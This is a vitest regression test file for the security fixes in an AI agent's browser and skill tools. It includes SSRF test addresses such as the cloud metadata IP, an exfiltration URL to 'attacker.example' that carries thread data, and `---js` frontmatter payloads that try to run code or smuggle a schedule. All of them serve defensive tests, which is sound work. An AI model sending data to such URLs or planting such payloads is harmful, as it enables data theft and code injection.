/**
 * Wave 3 review (verify pass): regression tests for fixed findings and
 * evidence for findings opened during verification. Offline: no Chromium
 * launch, no provider calls; DNS is stubbed via net-guard's test seam.
 */
import fs from 'node:fs';
import path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';
import { applyEnv, setupTestEnv, type TestEnv } from './helpers/env.js';
import { makeToolContext } from './helpers/fakes.js';
import { loadSrc, type LooseTool } from './helpers/modules.js';

applyEnv();

type Lookup = (host: string) => Promise<Array<{ address: string; family: number }>>;
interface NetGuardModule {
  setResolverForTests(fn?: Lookup): void;
  blockedAddressReason(ip: string): string | undefined;
  startEgressProxy(): Promise<{ url: string; isClosed?(): boolean; close(): Promise<void> }>;
}
type HookedTool = LooseTool & { onInputAvailable?: (o: { toolCallId: string; input: unknown; messages: unknown[] }) => unknown };
interface BrowserModule {
  createBrowserTools(ctx: unknown): Record<string, HookedTool>;
  setCurrentPageUrlForTests(url?: string): void;
  browserApprovalPreview(toolName: string, toolCallId: string, input: unknown, max?: number): string | undefined;
}

const guard = await loadSrc<NetGuardModule>('tools/net-guard.js');
const browser = await loadSrc<BrowserModule>('tools/browser.js');
const skills = await loadSrc<{
  getSkill(name: string): Promise<unknown>;
  loadAllSkills(): Promise<Array<{ name: string }>>;
  initDataRepo(): Promise<void>;
}>('skills.js');
const toolsMod = await loadSrc<{ createTools(ctx: unknown): Record<string, LooseTool> }>('tools/index.js');
const llm = await loadSrc<{ listAvailableModels(): string[] }>('llm.js');

let env: TestEnv;
beforeEach(async () => {
  env = await setupTestEnv({ db: false, env: { GOOGLE_GENERATIVE_AI_API_KEY: 'test-google-key' } });
  // Every name resolves to a public documentation-free address unless a test says otherwise.
  guard?.setResolverForTests(async () => [{ address: '93.184.215.14', family: 4 }]);
});
afterEach(async () => {
  guard?.setResolverForTests();
  browser?.setCurrentPageUrlForTests();
  await env.cleanup();
});

/** Mimic the SDK order: the call's onInputAvailable, then its needsApproval. */
async function announceAndCheck(t: HookedTool, toolCallId: string, input: unknown): Promise<boolean> {
  await t.onInputAvailable?.({ toolCallId, input, messages: [] });
  const na = t.needsApproval;
  return typeof na === 'function' ? Boolean(await na(input, { toolCallId, messages: [] })) : Boolean(na);
}

// ── REVIEW-H1, fixed by A25 ──
describe.skipIf(!browser || !guard)('REVIEW-H1 regression (A25 browser network guard)', () => {
  it('internal destinations: execute refuses with the A25 message and no approval is requested', async () => {
    const ctx = makeToolContext();
    const t = browser!.createBrowserTools(ctx);
    for (const url of ['http://169.254.169.254/', 'http://127.0.0.1/']) {
      expect(await announceAndCheck(t.browser_navigate!, `c-${url}`, { url }), url).toBe(false);
      await expect(t.browser_navigate!.execute!({ url }, { toolCallId: `c-${url}`, messages: [] })).rejects.toThrow(
        /^blocked: private\/metadata address/,
      );
    }
  });

  it('a public name that resolves to an internal address is refused the same way', async () => {
    guard!.setResolverForTests(async () => [{ address: '10.0.0.7', family: 4 }]);
    const t = browser!.createBrowserTools(makeToolContext());
    const url = 'https://internal-alias.example/';
    expect(await announceAndCheck(t.browser_navigate!, 'c1', { url })).toBe(false);
    await expect(t.browser_navigate!.execute!({ url }, { toolCallId: 'c1', messages: [] })).rejects.toThrow(
      /^blocked: private\/metadata address/,
    );
  });

  it('cross-site: first navigate is free; a later navigate to another host needs approval; same host (www. ignored) is free', async () => {
    const ctx = makeToolContext();
    const t = browser!.createBrowserTools(ctx);
    const exfil = { url: 'https://attacker.example/collect?note=thread-data' };
    expect(await announceAndCheck(t.browser_navigate!, 'first', exfil)).toBe(false);

    browser!.setCurrentPageUrlForTests('https://news.example/article');
    expect(await announceAndCheck(t.browser_navigate!, 'second', exfil)).toBe(true);
    expect(await announceAndCheck(t.browser_navigate!, 'third', { url: 'https://www.news.example/other' })).toBe(false);
  });

  it('reading, clicking and screenshots stay ungated per A25; typing stays gated per A24', () => {
    const t = browser!.createBrowserTools(makeToolContext());
    for (const name of ['browser_extract_text', 'browser_click', 'browser_screenshot']) {
      expect(t[name]!.needsApproval, name).toBeUndefined();
    }
    expect(t.browser_type!.needsApproval).toBe(true);
  });

  it('the egress proxy listens on loopback only', async () => {
    const proxy = await guard!.startEgressProxy();
    try {
      expect(proxy.url).toMatch(/^http:\/\/127\.0\.0\.1:\d+$/);
    } finally {
      await proxy.close();
    }
  });
});

// ── REVIEW-H2, fixed ──
describe.skipIf(!llm)('REVIEW-H2 regression: retired Google IDs are not advertised', () => {
  it('listAvailableModels has no gemini-2.5-pro / gemini-2.5-flash, and keeps live-verified IDs', () => {
    const ids = llm!.listAvailableModels();
    expect(ids).not.toContain('google:gemini-2.5-pro');
    expect(ids).not.toContain('google:gemini-2.5-flash');
    expect(ids).toContain('google:gemini-flash-latest');
  });
});

// ── REVIEW-M2, fixed on the read path ──
describe.skipIf(!skills)('REVIEW-M2 regression: skill files are parsed as YAML only', () => {
  it('a skill file with a non-YAML fence is rejected and never evaluated', async () => {
    const marker = `__REVIEW_M2_${Date.now()}`;
    fs.mkdirSync(env.paths.skills, { recursive: true });
    fs.writeFileSync(
      path.join(env.paths.skills, 'evil.md'),
      `---js\n{ name: (globalThis.${marker} = true, 'evil'), description: 'x' }\n---\nbody\n`,
    );
    await expect(skills!.getSkill('evil')).rejects.toThrow(/must be YAML/);
    expect((globalThis as Record<string, unknown>)[marker]).toBeUndefined();
  });
});

// ── REVIEW-C10 (fixed): a model-supplied skill body is never evaluated ──
describe.skipIf(!toolsMod || !skills)('REVIEW-C10 regression: skill bodies are written verbatim, never parsed', () => {
  const evalBody = (marker: string) => `---js\n{ name: (globalThis.${marker} = true, 'probe') }\n---\n## Objective\nhi\n`;
  const seen = (marker: string) => {
    const v = (globalThis as Record<string, unknown>)[marker];
    delete (globalThis as Record<string, unknown>)[marker];
    return v;
  };

  beforeEach(async () => {
    await skills!.initDataRepo();
  });

  it('create_skill with a `---js` body: not evaluated, rejected, nothing written', async () => {
    const marker = `__REVIEW_C10_create_${Date.now()}`;
    const t = toolsMod!.createTools(makeToolContext());
    const out = await Promise.resolve(
      t.create_skill!.execute!({ name: 'probe', description: 'p', body: evalBody(marker) }, { toolCallId: 'x', messages: [] }),
    ).catch((e: unknown) => String(e));
    expect(seen(marker)).toBeUndefined();
    expect(String(out)).toMatch(/must not start with a "---" line/);
    expect(fs.existsSync(path.join(env.paths.skills, 'probe.md'))).toBe(false);
  });

  it('update_skill with a `---js` body: not evaluated, rejected, original file unchanged', async () => {
    const marker = `__REVIEW_C10_update_${Date.now()}`;
    const file = path.join(env.paths.skills, 'morning-briefing.md');
    const before = fs.readFileSync(file, 'utf8');
    const t = toolsMod!.createTools(makeToolContext());
    await Promise.resolve(
      t.update_skill!.execute!(
        { name: 'morning-briefing', body: evalBody(marker), commitMessage: 'probe' },
        { toolCallId: 'x', messages: [] },
      ),
    ).catch(() => undefined);
    expect(seen(marker)).toBeUndefined();
    expect(fs.readFileSync(file, 'utf8')).toBe(before);
  });

  it('a body whose first non-blank line is a frontmatter fence is rejected (no smuggled schedule)', async () => {
    const t = toolsMod!.createTools(makeToolContext());
    const body = "\n\n---\nschedule: '* * * * *'\n---\n## Objective\nx\n";
    const out = await Promise.resolve(
      t.create_skill!.execute!({ name: 'fence', description: 'f', body }, { toolCallId: 'x', messages: [] }),
    ).catch((e: unknown) => String(e));
    expect(String(out)).toMatch(/must not start with a "---" line/);
    expect(fs.existsSync(path.join(env.paths.skills, 'fence.md'))).toBe(false);
  });

  it('reload: loadAllSkills skips a `---js` file on disk without evaluating it', async () => {
    const marker = `__REVIEW_C10_reload_${Date.now()}`;
    fs.writeFileSync(path.join(env.paths.skills, 'planted.md'), evalBody(marker));
    const all = await skills!.loadAllSkills();
    expect(seen(marker)).toBeUndefined();
    expect(all.map((s) => s.name)).not.toContain('planted');
  });

  it('a normal body round-trips byte for byte', async () => {
    const t = toolsMod!.createTools(makeToolContext());
    const body = '## Objective\nKeep `code` and --- dashes mid-text.\n\n## Learned Rules & Corrections\n- x\n';
    await t.create_skill!.execute!({ name: 'roundtrip', description: 'r', body }, { toolCallId: 'x', messages: [] });
    const s = (await skills!.getSkill('roundtrip')) as { body: string };
    expect(s.body).toBe(body);
  });
});

// ── REVIEW-H11 (fixed by A26): the cross-site preview carries the whole URL ──
describe.skipIf(!browser)('REVIEW-H11 regression: browser previews are complete', () => {
  it('browser_navigate preview contains the full target URL', () => {
    browser!.setCurrentPageUrlForTests('https://news.example/');
    const url = `https://attacker.example/c?pad=${'a'.repeat(600)}&tail=END_OF_URL`;
    const preview = browser!.browserApprovalPreview('browser_navigate', 'p1', { url }) ?? '';
    expect(preview).toContain(url);
  });

  it('browser_type preview contains the full text', () => {
    browser!.setCurrentPageUrlForTests('https://news.example/form');
    const text = `${'b'.repeat(1_500)}END_OF_TEXT`;
    const preview = browser!.browserApprovalPreview('browser_type', 'p2', { selector: '#q', text }) ?? '';
    expect(preview).toContain(text);
    expect(preview).toContain('https://news.example/form');
  });
});

// ── REVIEW-L12 (fixed): proxy lifecycle and transition-address decoding ──
describe.skipIf(!guard)('REVIEW-L12 regression', () => {
  it('a closed proxy reports isClosed() so the browser can recreate it', async () => {
    const proxy = await guard!.startEgressProxy();
    expect(proxy.isClosed?.()).toBe(false);
    await proxy.close();
    expect(proxy.isClosed?.()).toBe(true);
  });

  it('6to4, SIIT and Teredo forms that embed a link-local IPv4 are blocked', () => {
    for (const ip of ['2002:a9fe:a9fe::1', '::ffff:0:a9fe:a9fe', '2001:0:a9fe:a9fe::1']) {
      expect(guard!.blockedAddressReason(ip), ip).toBeDefined();
    }
    expect(guard!.blockedAddressReason('2606:4700::1111')).toBeUndefined(); // ordinary public IPv6
  });
});
